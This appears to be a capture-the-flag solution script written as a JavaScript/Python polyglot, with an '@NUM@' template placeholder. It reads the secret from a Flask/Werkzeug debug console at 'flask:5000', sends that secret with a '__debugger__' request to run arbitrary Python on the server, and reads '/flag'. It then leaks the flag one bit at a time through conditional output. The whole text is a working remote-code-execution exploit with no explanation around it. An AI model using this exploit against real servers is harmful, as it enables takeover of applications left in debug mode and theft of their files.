3 // 4; '''
require('fs').readFile('/flag', 'utf8', function (err,data) {
    if (err) {
     return console.log(err);
    }
    console.log(data.trim());
});
/* '''
from urllib.parse import urlencode, quote_plus
import subprocess as s
console = s.run(['curl', 'flask:5000/console'], capture_output=True).stdout
pos = console.find(b'SECRET')
secret = console[pos+10:pos+30]
# print(console, secret)
cmd = 'print(open("/flag", "r").read().strip())'

payload = { '__debugger__': 'yes', 'cmd': cmd, 'frm': '0', 's': str(secret,
'ascii') }
result = urlencode(payload, quote_via=quote_plus)
out = s.run(['curl', f'flask:5000/console/?{result}'],
capture_output=True).stdout
trueflag = out.split(b'\n')[1]
def to_bit(data):
    def access_bit(num):
        base = int(num // 8)
        shift = int(num % 8)
        return (data[base] >> shift) & 0x1
    return [access_bit(i) for i in range(len(data)*8)]
T = to_bit(trueflag)[@NUM@]
if T == 1:
    print(open('/flag', 'r').read().strip())
''' */ 1 // 3 '''
